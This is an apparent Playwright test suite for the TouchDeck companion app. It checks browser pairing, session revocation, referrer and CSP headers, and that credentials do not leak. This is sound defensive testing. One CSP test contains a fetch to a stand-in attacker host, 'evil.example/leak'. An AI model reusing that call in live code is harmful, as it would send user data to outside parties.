import { spawn, type ChildProcess } from 'node:child_process';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { expect, test, type APIRequestContext } from '@playwright/test';

test.describe.configure({ mode: 'serial' });
test.use({ trace: 'off', screenshot: 'off', video: 'off' });
let process: ChildProcess;
let data: string;
let origin: string;
let token: string;
let pairingToken: string;

test.beforeAll(async ({ request }) => {
  data = await mkdtemp(join(tmpdir(), 'touchdeck-pairing-'));
  process = spawn(resolve('../target/debug', globalThis.process.platform === 'win32' ? 'td-companion.exe' : 'td-companion'), ['--mock-devices', '1'], {
    env: { ...globalThis.process.env, TOUCHDECK_APP_DATA_DIR: data }, stdio: 'ignore', windowsHide: true,
  });
  const runtimePath = join(data, 'runtime', 'companion.json');
  await expect.poll(async () => {
    try {
      const runtime: unknown = JSON.parse(await readFile(runtimePath, 'utf8'));
      if (typeof runtime !== 'object' || runtime === null || !('port' in runtime) || typeof runtime.port !== 'number' || !('token' in runtime) || typeof runtime.token !== 'string') return false;
      origin = `http://127.0.0.1:${runtime.port}`;
      pairingToken = runtime.token;
      const response = await request.post(`${origin}/api/v1/auth/sessions`, { headers: { Authorization: `Bearer ${runtime.token}` }, data: { kind: 'window' } });
      const session: unknown = await response.json();
      if (typeof session !== 'object' || session === null || !('token' in session) || typeof session.token !== 'string') return false;
      token = session.token;
      return true;
    } catch { return false; }
  }).toBe(true);
});
test.beforeEach(async ({ request }) => {
  const response = await request.post(`${origin}/api/v1/auth/sessions`, { headers: { Authorization: `Bearer ${pairingToken}` }, data: { kind: 'window' } });
  const session: unknown = await response.json();
  if (typeof session !== 'object' || session === null || !('token' in session) || typeof session.token !== 'string') throw new Error('Missing window session');
  token = session.token;
  expect((await request.delete(`${origin}/api/v1/auth/sessions?kind=browser`, { headers: { Authorization: `Bearer ${token}` } })).status()).toBe(204);
});

test.afterAll(async ({ request }) => {
  if (origin && token) await request.post(`${origin}/api/v1/system/shutdown`, { headers: { Authorization: `Bearer ${token}` } }).catch(() => {});
  if (process && process.exitCode === null) await new Promise<void>(done => { process.once('exit', () => done()); process.kill(); });
  if (data) await rm(data, { recursive: true, force: true });
});

async function pairingLink(request: APIRequestContext) {
  const headers = { Authorization: `Bearer ${token}` };
  const minted = await request.post(`${origin}/api/v1/auth/pair-codes`, { headers });
  expect(minted.status()).toBe(200);
  expect(Object.keys(await minted.json())).toEqual(['expires_ms']);
  const capture: unknown = await (await request.get(`${origin}/api/v1/test/pairing-delivery`, { headers })).json();
  if (typeof capture !== 'object' || capture === null || !('url' in capture) || typeof capture.url !== 'string' || !('notification' in capture) || typeof capture.notification !== 'string') throw new Error('Native delivery missing');
  return { url: capture.url, notification: capture.notification };
}

for (const delivery of ['link', 'manual']) {
  test(`pairs through native ${delivery} delivery`, async ({ page, request }) => {
    const capture = await pairingLink(request);
    if (delivery === 'link') await page.goto(capture.url);
    else {
      await page.goto(`${origin}/pair`);
      await page.getByLabel('Code', { exact: true }).fill(capture.notification);
      await page.getByRole('button', { name: 'Pair', exact: true }).click();
    }
    await expect(page).toHaveURL(`${origin}/`);
    await expect(page.getByRole('list', { name: 'Devices' }).getByRole('listitem')).toHaveCount(1);
    expect(await page.evaluate(() => !!localStorage.getItem('touchdeck.session'))).toBe(true);
    await page.reload();
    await expect(page.getByRole('list', { name: 'Devices' }).getByRole('listitem')).toHaveCount(1);
  });
}

test('removes fragment and query before rejecting a wrong code', async ({ page }) => {
  await page.goto(`${origin}/pair?code=wrong#code=also-wrong`);
  await expect(page).toHaveURL(`${origin}/pair`);
  await expect(page.getByRole('alert')).toContainText('expired or is wrong');
});


test('Troubleshooting shows mock hello facts and Forget all signs browsers out in one request', async ({ page, browser, request }) => {
  const capture = await pairingLink(request);
  await page.goto(capture.url);
  await expect(page).toHaveURL(`${origin}/`);
  const other = await pairingLink(request);
  const paired = await browser.newContext();
  try {
    const second = await paired.newPage();
    await second.goto(other.url);
    await expect(second).toHaveURL(`${origin}/`);
    const windowContext = await browser.newContext();
    try {
      await windowContext.addInitScript((sessionToken) => localStorage.setItem('touchdeck.session', sessionToken), token);
      const window = await windowContext.newPage();
      await window.goto(origin);
      await window.getByRole('navigation', { name: 'Main' }).getByRole('button', { name: 'Settings' }).click();
      await window.getByRole('button', { name: /^Troubleshooting/ }).click();
      const details = window.getByTestId('device-details');
      for (const [key, value] of [['product', 'touchdeck'], ['running', 'ota_0'], ['sinks', 'log, link'], ['layout', 'builtin']]) {
        await expect(details.locator(`[data-fact="${key}"] dd`)).toHaveText(value);
      }
      await window.screenshot({ path: test.info().outputPath('troubleshooting.png') });
      await window.getByRole('button', { name: 'Back', exact: true }).click();
      const deletes: string[] = [];
      window.on('request', req => { if (req.method() === 'DELETE') deletes.push(req.url()); });
      await window.getByRole('button', { name: 'Forget all', exact: true }).click();
      await window.getByRole('alertdialog').getByRole('button', { name: 'Forget all', exact: true }).click();
      await expect(window.getByTestId('paired-browser')).toHaveCount(0);
      await expect(page).toHaveURL(`${origin}/pair`);
      await expect(second).toHaveURL(`${origin}/pair`);
      expect(deletes).toEqual([`${origin}/api/v1/auth/sessions?kind=browser`]);
      await expect(window.getByRole('dialog', { name: 'Settings', exact: true })).toBeVisible();
    } finally { await windowContext.close(); }
  } finally { await paired.close(); }
});


test('query codes are cleared without being redeemed', async ({ page, request }) => {
  const capture = await pairingLink(request);
  const code = new URL(capture.url).hash.slice(6);
  const calls: string[] = [];
  page.on('request', r => { if (r.url().endsWith('/auth/pair')) calls.push(r.url()); });
  await page.goto(`${origin}/pair?code=${code}`);
  await expect(page.getByRole('heading', { name: 'Pair this browser' })).toBeVisible();
  await expect(page.getByLabel('Code', { exact: true })).toHaveValue('');
  await expect(page).toHaveURL(`${origin}/pair`);
  expect(calls).toEqual([]);
  await page.goto('about:blank');
  await page.goto(capture.url);
  await expect(page).toHaveURL(`${origin}/`);
});

test('paired browser uses every available screen without leaking credentials', async ({ page, request, context }) => {
  const headers = { Authorization: `Bearer ${token}` };
  const layout = { schema: 1, name: 'Browser Layout', orientation: 'landscape', pages: [
    { id: 'keys', title: 'Keys', kind: 'grid', rows: 1, cols: 1, tiles: [] },
  ] };
  expect((await request.put(`${origin}/api/v1/devices/mock0001/layouts/landscape`, { headers, data: layout })).status()).toBe(202);
  await expect.poll(async () => (await request.get(`${origin}/api/v1/devices/mock0001/layouts/landscape`, { headers })).status()).toBe(200);

  const errors: string[] = [];
  const requests: { url: string; referer: string }[] = [];
  page.on('pageerror', e => errors.push(e.message));
  page.on('console', m => { if (m.type() === 'error') errors.push(`${m.text()} ${m.location().url}`); });
  page.on('request', r => requests.push({ url: r.url(), referer: r.headers()['referer'] ?? '' }));
  const capture = await pairingLink(request);
  const response = await page.goto(capture.url);
  expect(response?.headers()['referrer-policy']).toBe('no-referrer');
  expect(response?.headers()['content-security-policy']).toContain("default-src 'self'");
  await expect(page).toHaveURL(`${origin}/`);
  const saved = await page.evaluate(() => localStorage.getItem('touchdeck.session'));
  expect(saved).toMatch(/^tds_/);
  await page.reload();
  await expect(page.getByRole('list', { name: 'Devices' })).toBeVisible();
  await page.getByRole('list', { name: 'Devices' }).getByRole('button').first().click();
  await expect(page.getByTestId('editor')).toBeVisible();
  await page.getByTestId('start-pull').click();
  await expect(page.getByTestId('status')).toHaveAttribute('data-event', 'pulled', { timeout: 30_000 });
  await page.getByTestId('device-name').click();
  const name = page.getByTestId('device-panel-name');
  await name.fill('Browser Device');
  await name.press('Enter');
  await expect(page.getByTestId('device-name')).toHaveText('Browser Device');
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'Integrations', exact: true }).click();
  const thisPc = page.locator('[data-testid="integration"][data-id="this_pc"]').getByTestId('integration-switch');
  await thisPc.click();
  await expect(thisPc).toHaveAttribute('aria-checked', 'false');
  await thisPc.click();
  await expect(thisPc).toHaveAttribute('aria-checked', 'true');
  await page.getByRole('navigation', { name: 'Main' }).getByRole('button', { name: 'Settings' }).click();
  await page.getByRole('button', { name: 'Dark', exact: true }).click();
  await expect(page.getByRole('button', { name: 'Dark', exact: true })).toHaveAttribute('aria-pressed', 'true');
  await expect(page.getByRole('button', { name: 'Check for updates' })).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Update available' })).toHaveCount(0);
  await page.getByRole('button', { name: /^Troubleshooting/ }).click();
  await expect(page.getByTestId('device-details')).toBeVisible();
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'Paired browsers' })).toBeVisible();
  await page.screenshot({ path: test.info().outputPath('browser-settings.png') });
  const history = await context.newCDPSession(page);
  const entries = await history.send('Page.getNavigationHistory');
  const code = new URL(capture.url).hash.slice(6);
  for (const entry of entries.entries) {
    expect(entry.url).not.toContain(code);
    if (saved) expect(entry.url).not.toContain(saved);
  }
  for (const r of requests) {
    expect(new URL(r.url).search).not.toContain(code);
    expect(r.referer).toBe('');
    if (saved) expect(r.url).not.toContain(saved);
    expect(new URL(r.url).origin).toBe(origin);
  }
  expect(errors).toEqual([]);
});

for (const own of [false, true]) {
  test(`forget one browser from ${own ? 'itself' : 'window'} locks it out alone`, async ({ page, browser, request }) => {
    const first = await pairingLink(request);
    await page.goto(first.url);
    await expect(page).toHaveURL(`${origin}/`);
    const copied = await page.evaluate(() => localStorage.getItem('touchdeck.session'));
    if (!copied) throw new Error('Missing paired session');
    const secondContext = await browser.newContext();
    const windowContext = await browser.newContext();
    try {
      const second = await secondContext.newPage();
      await second.goto((await pairingLink(request)).url);
      await expect(second).toHaveURL(`${origin}/`);
      await windowContext.addInitScript(t => { globalThis.window.openTouchDeck = { version: 1, session: async () => t, onSessionChanged: () => {} }; }, token);
      const window = await windowContext.newPage();
      await window.goto(origin);
      await expect(window.getByRole('list', { name: 'Devices' })).toBeVisible();
      const control = own ? page : window;
      await control.getByRole('navigation', { name: 'Main' }).getByRole('button', { name: 'Settings' }).click();
      const rows = control.getByTestId('paired-browser');
      const row = own ? rows.filter({ hasText: 'This browser' }) : rows.first();
      await row.getByRole('button').click();
      await control.getByRole('alertdialog').getByRole('button', { name: 'Forget', exact: true }).click();
      await expect(page).toHaveURL(`${origin}/pair`);
      expect((await request.get(`${origin}/api/v1/system`, { headers: { Authorization: `Bearer ${copied}` } })).status()).toBe(401);
      await second.reload();
      await expect(second.getByRole('list', { name: 'Devices' })).toBeVisible();
      if (!own) await window.keyboard.press('Escape');
      await expect(window.getByRole('navigation', { name: 'Main' })).toBeVisible();
    } finally { await secondContext.close(); await windowContext.close(); }
  });
}


test('served CSP prevents third-party connections', async ({ page, request }) => {
  await page.goto((await pairingLink(request)).url);
  await expect(page).toHaveURL(`${origin}/`);
  let reached = false;
  await page.route('https://evil.example/**', route => { reached = true; return route.fulfill({ body: 'unexpected' }); });
  expect(await page.evaluate(async () => {
    try { await fetch('https://evil.example/leak'); return false; } catch { return true; }
  })).toBe(true);
  expect(reached).toBe(false);
});

test('Companion restart invalidates the stored browser session', async ({ page, request }) => {
  await page.goto((await pairingLink(request)).url);
  await expect(page).toHaveURL(`${origin}/`);
  const copied = await page.evaluate(() => localStorage.getItem('touchdeck.session'));
  expect(copied).toMatch(/^tds_/);
  const exited = new Promise<void>(done => process.once('exit', () => done()));
  expect((await request.post(`${origin}/api/v1/system/shutdown`, { headers: { Authorization: `Bearer ${token}` } })).status()).toBe(204);
  await exited;
  process = spawn(resolve('../target/debug', globalThis.process.platform === 'win32' ? 'td-companion.exe' : 'td-companion'), ['--mock-devices', '1'], {
    env: { ...globalThis.process.env, TOUCHDECK_APP_DATA_DIR: data }, stdio: 'ignore', windowsHide: true,
  });
  await expect.poll(async () => {
    try {
      const runtime: unknown = JSON.parse(await readFile(join(data, 'runtime', 'companion.json'), 'utf8'));
      if (typeof runtime !== 'object' || runtime === null || !('token' in runtime) || typeof runtime.token !== 'string' || runtime.token === pairingToken) return false;
      pairingToken = runtime.token;
      return true;
    } catch { return false; }
  }).toBe(true);
  expect((await request.get(`${origin}/api/v1/system`, { headers: { Authorization: `Bearer ${copied}` } })).status()).toBe(401);
  await page.reload();
  await expect(page).toHaveURL(`${origin}/pair`);
  expect(await page.evaluate(() => localStorage.getItem('touchdeck.session'))).toBeNull();
});
